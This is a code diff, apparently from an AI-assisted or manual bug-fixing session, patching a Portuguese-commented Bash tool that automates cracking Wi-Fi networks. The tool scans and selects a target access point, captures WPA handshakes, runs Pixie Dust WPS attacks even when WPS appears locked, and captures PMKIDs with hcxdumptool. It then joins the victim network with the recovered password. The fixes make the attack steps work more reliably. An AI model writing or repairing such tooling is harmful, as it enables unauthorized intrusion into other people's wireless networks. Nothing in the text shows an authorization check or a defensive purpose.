@@ -298,7 +298,7 @@ escanear_e_escolher_alvo() {
     for linha in "${linhas_ap[@]}"; do
         IFS=',' read -ra campos <<< "$linha"
         # índices do formato padrão airodump CSV (0-based):
-        # 0 BSSID, 5 channel, 6 speed, 7 privacy, 8 cipher, 9 auth, 8... 10 power
+        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power
         local bssid ch privacy power essid
         bssid="$(echo "${campos[0]}" | xargs)"
         ch="$(echo "${campos[3]}" | xargs)"
@@ -351,7 +351,9 @@ escanear_e_escolher_alvo() {
     TARGET_CH="${lista_ch[$idx]}"
     TARGET_ENC="${lista_enc[$idx]}"
 
-    if [[ "$TARGET_CH" =~ ^1[4-9]$|^[2-9][0-9]+$|^1[3-9][0-9]+$ ]] && [[ "$TARGET_CH" -ge 36 ]]; then
+    # Canais 5 GHz são todos >= 36; 2.4 GHz são todos <= 14. O regex antigo
+    # não casava a faixa 100-129 e marcava esses canais como 2.4 GHz.
+    if [[ "$TARGET_CH" =~ ^[0-9]+$ ]] && (( TARGET_CH >= 36 )); then
         TARGET_FREQ_LABEL="5 GHz"
     else
         TARGET_FREQ_LABEL="2.4 GHz"
@@ -433,7 +435,7 @@ capturar_handshake() {
         sleep 10
         local capfile
         capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
-        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -qi "1 handshake"; then
+        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -Eqi "[0-9]+ handshake"; then
             handshake_ok=1
             break
         fi
@@ -465,7 +467,7 @@ capturar_handshake() {
 
         local capfile
         capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
-        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -qi "1 handshake"; then
+        if [[ -n "$capfile" ]] && aircrack-ng "$capfile" 2>/dev/null | grep -Eqi "[0-9]+ handshake"; then
             handshake_ok=1
         fi
     fi
@@ -573,10 +575,15 @@ rota_wps() {
         return 1
     fi
 
-    if echo "$wash_out" | grep -i "${TARGET_BSSID}" | grep -qi "No"; then
-        log "WPS parece desbloqueado (Lck: No). Tentando Pixie Dust..."
+    # O status de bloqueio do WPS é a coluna Lck (5º campo do wash):
+    # BSSID  Ch  dBm  WPS  Lck  Vendor. Grepar a linha inteira por "No" dava
+    # falso positivo (ex.: "Unknown"/"Nokia" no campo Vendor contêm "no").
+    local lck
+    lck="$(echo "$wash_out" | awk -v b="${TARGET_BSSID}" 'toupper($1)==toupper(b){print $5; exit}')"
+    if [[ "${lck}" == "No" ]]; then
+        log "WPS desbloqueado (Lck: No). Tentando Pixie Dust..."
     else
-        log "WPS pode estar bloqueado (Lck: Yes), mas vou tentar Pixie Dust mesmo assim."
+        log "WPS pode estar bloqueado (Lck: ${lck:-?}), mas vou tentar Pixie Dust mesmo assim."
     fi
 
     # --- Pixie Dust: monitorar saída em tempo real, com timeout e detecção de loop ---
@@ -738,9 +745,18 @@ rota_pmkid() {
         return 1
     fi
 
-    # -c exige o sufixo de banda junto do canal: "a" = 2.4GHz, "b" = 5GHz
-    local banda_sufixo="a"
-    [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]] && banda_sufixo="b"
+    # O -c do hcxdumptool aceita canal (<=1000) OU frequência em MHz (>1000);
+    # a doc recomenda usar frequência em 5 GHz. Calculamos a frequência do
+    # canal pra não depender de sufixos de banda (que variam entre versões e
+    # cuja convenção a/b é ambígua).
+    local freq_mhz
+    if [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]]; then
+        freq_mhz=$(( 5000 + TARGET_CH * 5 ))
+    elif [[ "${TARGET_CH}" -eq 14 ]]; then
+        freq_mhz=2484
+    else
+        freq_mhz=$(( 2407 + TARGET_CH * 5 ))
+    fi
 
     # hcxdumptool NÃO funciona sobre uma interface monitor já criada pelo
     # airmon-ng/iw (ele gerencia o modo monitor sozinho, direto na interface
@@ -752,9 +768,10 @@ rota_pmkid() {
     airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
     sleep 1
 
-    log "Tentando capturar PMKID direto do roteador por 30s (canal ${TARGET_CH}${banda_sufixo})..."
-    timeout --kill-after=5 30s hcxdumptool -i "${IFACE}" -o "$pmkid_cap" \
-        --bpf="$bpf_file" -c "${TARGET_CH}${banda_sufixo}" &>>"$LOGFILE"
+    # -w (não -o) é o flag de saída no hcxdumptool >= 6.3.0 / 7.x (Ubuntu/Kali atuais).
+    log "Tentando capturar PMKID direto do roteador por 30s (canal ${TARGET_CH}, ${freq_mhz} MHz)..."
+    timeout --kill-after=5 30s hcxdumptool -i "${IFACE}" -w "$pmkid_cap" \
+        --bpf="$bpf_file" -c "${freq_mhz}" &>>"$LOGFILE"
 
     # Sempre volta pro modo monitor via airmon-ng, mesmo se a rota falhar —
     # as próximas rotas (dicionário) dependem disso.
@@ -850,6 +867,9 @@ conectar_e_obter_gateway() {
     airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
     systemctl restart NetworkManager &>>"$LOGFILE"
     sleep 5
+    # NM já foi restaurado aqui — zera a flag pra o trap de cleanup não
+    # reiniciar o NetworkManager de novo (desconexão breve desnecessária).
+    MONITOR_MODE_ATIVO=0
 
     log "Conectando à rede ${TARGET_ESSID} com a senha descoberta..."
     # Aspas simples preservam caracteres especiais (&, $, :, etc.) na senha
